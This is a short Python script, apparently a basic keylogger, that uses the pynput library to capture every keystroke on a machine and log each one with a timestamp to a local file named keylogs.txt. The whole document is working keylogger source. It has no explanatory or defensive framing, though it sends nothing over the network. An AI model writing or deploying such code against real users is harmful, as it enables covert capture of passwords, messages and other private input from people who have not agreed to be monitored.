from pynput.keyboard import Listener
import logging
import time


logging.basicConfig(
    filename="keylogs.txt",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)


def on_press(key):

    logging.info(str(key))
    time.sleep(0.05)



with Listener(
    on_press=on_press
) as listener:

    listener.join()